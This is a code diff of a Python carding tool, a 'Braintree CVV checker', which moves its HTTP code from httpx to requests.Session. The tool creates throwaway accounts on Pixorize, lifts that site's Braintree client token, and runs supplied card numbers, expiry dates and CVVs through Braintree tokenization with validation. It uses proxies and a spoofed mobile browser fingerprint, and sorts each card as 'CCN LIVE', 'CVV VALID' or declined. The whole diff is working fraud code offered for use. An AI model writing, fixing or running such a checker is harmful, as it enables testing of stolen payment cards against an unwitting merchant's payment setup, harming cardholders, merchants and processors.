@@ -1,6 +1,7 @@
 """
 Braintree CVV Auth Checker
 Uses direct Braintree API for CVV validation via tokenization.
+Uses requests.Session (not httpx) to avoid Client.init() compatibility issues.
 """
 
 import asyncio
@@ -11,7 +12,7 @@ import json
 from concurrent.futures import ThreadPoolExecutor
 from typing import Optional
 
-import httpx
+import requests
 
 executor = ThreadPoolExecutor(max_workers=10)
 
@@ -27,17 +28,19 @@ def generate_random_email() -> str:
 def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Optional[str] = None) -> dict:
     """
     Check Braintree CVV authentication via Pixorize.
+    Uses requests.Session for compatibility and reliable HTTP.
     
     Args:
         card: Card number
         mes: Expiry month
         ano: Expiry year (2 or 4 digits)
         cvv: CVV code
-        proxy: Optional proxy string
+        proxy: Optional proxy string (e.g. user:pass@ip:port or http://...)
         
     Returns:
         dict with status and response
     """
+    session = None
     try:
         # Normalize year
         if len(ano) == 4:
@@ -45,93 +48,78 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
         if len(mes) == 1:
             mes = f"0{mes}"
         
-        # Setup proxy
-        proxy_url = None
-        if proxy:
-            proxy_url = proxy if proxy.startswith("http") else f"http://{proxy}"
+        proxies = None
+        if proxy and str(proxy).strip():
+            px = str(proxy).strip()
+            if not px.startswith(("http://", "https://")):
+                px = f"http://{px}"
+            proxies = {"http": px, "https": px}
         
-        # Create client
-        client = httpx.Client(
-            timeout=60.0,
-            proxy=proxy_url,
-            follow_redirects=True
-        )
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Content-Type": "application/json",
+            "sec-ch-ua": '"Chromium";v="120", "Not/A)Brand";v="24"',
+            "sec-ch-ua-platform": '"Android"',
+            "sec-ch-ua-mobile": "?1",
+            "Origin": "https://pixorize.com",
+            "Referer": "https://pixorize.com/",
+        })
         
-        headers = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-            'Content-Type': "application/json",
-            'sec-ch-ua': '"Chromium";v="120", "Not/A)Brand";v="24"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-mobile': "?1",
-            'Origin': "https://pixorize.com",
-            'Referer': "https://pixorize.com/",
-        }
+        kw = {"timeout": 60, "allow_redirects": True}
+        if proxies:
+            kw["proxies"] = proxies
         
         # Step 1: Register user
         email = generate_random_email()
         register_payload = {
             "email": email,
             "password": f"Pass{random.randint(1000, 9999)}!@#",
-            "learner_classification": 1
+            "learner_classification": 1,
         }
-        
-        response = client.post(
+        r = session.post(
             "https://apitwo.pixorize.com/users/register-simple",
             json=register_payload,
-            headers=headers
+            **kw
         )
-        
-        if response.status_code not in [200, 201]:
-            client.close()
-            return {
-                "status": "error",
-                "response": "Registration Failed"
-            }
+        if r.status_code not in (200, 201):
+            return {"status": "error", "response": "Registration Failed"}
         
         # Step 2: Get Braintree token
-        response = client.get(
-            "https://apitwo.pixorize.com/braintree/token",
-            headers=headers
-        )
-        
-        if response.status_code != 200:
-            client.close()
-            return {
-                "status": "error",
-                "response": "Token Fetch Failed"
-            }
+        r = session.get("https://apitwo.pixorize.com/braintree/token", **kw)
+        if r.status_code != 200:
+            return {"status": "error", "response": "Token Fetch Failed"}
         
         try:
-            token_data = response.json()
-            payload = token_data.get('payload')
-            if not payload:
-                client.close()
-                return {
-                    "status": "error",
-                    "response": "No payload in token response"
-                }
-            client_token = payload.get('clientToken')
-            if not client_token:
-                client.close()
-                return {
-                    "status": "error",
-                    "response": "No clientToken in payload"
-                }
-            decoded = base64.b64decode(client_token).decode('utf-8')
-            auth_fingerprint = json.loads(decoded)['authorizationFingerprint']
+            token_data = r.json()
         except Exception as e:
-            client.close()
-            return {
-                "status": "error",
-                "response": f"Token Parse Failed: {str(e)[:30]}"
-            }
+            return {"status": "error", "response": f"Token JSON parse failed: {str(e)[:25]}"}
         
-        # Step 3: Tokenize card via Braintree GraphQL with CVV validation
+        payload = token_data.get("payload") if isinstance(token_data, dict) else None
+        if not payload:
+            return {"status": "error", "response": "No payload in token response"}
+        
+        client_token = payload.get("clientToken")
+        if not client_token:
+            return {"status": "error", "response": "No clientToken in payload"}
+        
+        try:
+            decoded = base64.b64decode(client_token).decode("utf-8")
+            auth_fingerprint = json.loads(decoded).get("authorizationFingerprint")
+        except Exception as e:
+            return {"status": "error", "response": f"Token decode failed: {str(e)[:25]}"}
+        
+        if not auth_fingerprint:
+            return {"status": "error", "response": "No authorizationFingerprint in token"}
+        
+        # Step 3: Tokenize card via Braintree GraphQL
         tokenize_payload = {
             "clientSdkMetadata": {
                 "source": "client",
                 "integration": "dropin2",
-                "sessionId": str(uuid.uuid4())
+                "sessionId": str(uuid.uuid4()),
             },
             "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                 tokenizeCreditCard(input: $input) {
@@ -165,120 +153,90 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
                             "streetAddress": "123 Main St",
                             "locality": "New York",
                             "region": "NY",
-                            "countryCodeAlpha2": "US"
-                        }
+                            "countryCodeAlpha2": "US",
+                        },
                     },
-                    "options": {"validate": True}
+                    "options": {"validate": True},
                 }
             },
-            "operationName": "TokenizeCreditCard"
+            "operationName": "TokenizeCreditCard",
         }
         
-        braintree_headers = {
-            'User-Agent': headers['User-Agent'],
-            'Content-Type': 'application/json',
-            'Authorization': f'Bearer {auth_fingerprint}',
-            'Braintree-Version': '2018-05-10',
-            'Origin': 'https://assets.braintreegateway.com',
-            'Referer': 'https://assets.braintreegateway.com/'
+        bt_headers = {
+            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 Chrome/120.0"),
+            "Content-Type": "application/json",
+            "Authorization": f"Bearer {auth_fingerprint}",
+            "Braintree-Version": "2018-05-10",
+            "Origin": "https://assets.braintreegateway.com",
+            "Referer": "https://assets.braintreegateway.com/",
         }
         
-        response = client.post(
+        r = session.post(
             "https://payments.braintree-api.com/graphql",
             json=tokenize_payload,
-            headers=braintree_headers
+            headers=bt_headers,
+            **kw
         )
         
-        client.close()
-        
-        # Parse tokenization response
         try:
-            data = response.json()
-        except:
-            return {
-                "status": "error",
-                "response": "Invalid API Response"
-            }
+            data = r.json()
+        except Exception:
+            return {"status": "error", "response": "Invalid API Response (not JSON)"}
         
-        # Check for errors
-        if "errors" in data and data["errors"]:
-            error_msg = data["errors"][0].get("message", "Unknown Error")
-            error_upper = error_msg.upper()
+        if not isinstance(data, dict):
+            return {"status": "error", "response": "Invalid API Response"}
+        
+        # Check for GraphQL errors
+        errors = data.get("errors")
+        if errors and isinstance(errors, list):
+            err = errors[0] if errors else {}
+            error_msg = err.get("message", "Unknown Error") if isinstance(err, dict) else str(err)
+            error_upper = str(error_msg).upper()
             
-            # CVV/CVC validation errors indicate card is valid but wrong CVV
-            if any(x in error_upper for x in ["CVV", "CVC", "SECURITY CODE"]):
-                return {
-                    "status": "ccn",
-                    "response": f"CCN LIVE - Wrong CVV"
-                }
-            
-            # Card validation failed - declined reasons
-            if any(x in error_upper for x in [
+            if any(x in error_upper for x in ("CVV", "CVC", "SECURITY CODE")):
+                return {"status": "ccn", "response": "CCN LIVE - Wrong CVV"}
+            if any(x in error_upper for x in (
                 "DECLINED", "INVALID", "EXPIRED", "DO NOT HONOR",
                 "INSUFFICIENT", "LOST", "STOLEN", "FRAUD", "RESTRICTED",
-                "NOT PERMITTED", "PICKUP", "REVOKED"
-            ]):
-                return {
-                    "status": "declined",
-                    "response": f"Declined: {error_msg[:60]}"
-                }
-            
-            # Other validation errors
-            if any(x in error_upper for x in ["FAILED", "UNABLE", "CANNOT", "BLOCKED"]):
-                return {
-                    "status": "declined",
-                    "response": f"Validation Failed: {error_msg[:50]}"
-                }
-            
-            # Unknown error - treat as error
-            return {
-                "status": "error",
-                "response": f"Error: {error_msg[:60]}"
-            }
+                "NOT PERMITTED", "PICKUP", "REVOKED",
+            )):
+                return {"status": "declined", "response": f"Declined: {error_msg[:60]}"}
+            if any(x in error_upper for x in ("FAILED", "UNABLE", "CANNOT", "BLOCKED")):
+                return {"status": "declined", "response": f"Validation Failed: {error_msg[:50]}"}
+            return {"status": "error", "response": f"Error: {error_msg[:60]}"}
         
-        # Check for successful tokenization with validation
-        if "data" in data and data["data"]:
-            tokenize_result = data["data"].get("tokenizeCreditCard")
-            if tokenize_result and tokenize_result.get("token"):
-                # Card was tokenized successfully with validation
-                cc_info = tokenize_result.get("creditCard", {})
-                bin_data = cc_info.get("binData", {})
-                
-                bank = bin_data.get("issuingBank", "Unknown") or "Unknown"
-                country = bin_data.get("countryOfIssuance", "Unknown") or "Unknown"
-                brand = cc_info.get("brandCode", "Unknown") or "Unknown"
-                
+        # Success path
+        inner = data.get("data")
+        if isinstance(inner, dict):
+            tokenize_result = inner.get("tokenizeCreditCard")
+            if isinstance(tokenize_result, dict) and tokenize_result.get("token"):
+                cc_info = tokenize_result.get("creditCard") or {}
+                bin_data = cc_info.get("binData") or {}
+                bank = (bin_data.get("issuingBank") or "Unknown")[:20]
+                country = bin_data.get("countryOfIssuance") or "Unknown"
+                brand = cc_info.get("brandCode") or "Unknown"
                 return {
                     "status": "approved",
-                    "response": f"CVV VALID ✓ | {brand} | Bank: {bank[:20]}"
+                    "response": f"CVV VALID ✓ | {brand} | Bank: {bank}",
                 }
-            else:
-                return {
-                    "status": "declined",
-                    "response": "Tokenization Failed - No Token"
-                }
+            return {"status": "declined", "response": "Tokenization Failed - No Token"}
         
-        # Default decline for unknown response
-        return {
-            "status": "declined",
-            "response": f"Unknown Response"
-        }
-        
-    except httpx.TimeoutException:
-        return {
-            "status": "error",
-            "response": "Request Timeout"
-        }
-    except httpx.ConnectError:
-        return {
-            "status": "error",
-            "response": "Connection Error"
-        }
+        return {"status": "declined", "response": "Unknown Response"}
+    
+    except requests.exceptions.Timeout:
+        return {"status": "error", "response": "Request Timeout"}
+    except requests.exceptions.ConnectionError:
+        return {"status": "error", "response": "Connection Error"}
+    except requests.exceptions.ProxyError:
+        return {"status": "error", "response": "Proxy Error"}
     except Exception as e:
-        return {
-            "status": "error",
-            "response": f"Error: {str(e)[:50]}"
-        }
+        return {"status": "error", "response": f"Error: {str(e)[:50]}"}
+    finally:
+        if session is not None:
+            try:
+                session.close()
+            except Exception:
+                pass
 
 
 async def async_check_braintree_cvv(
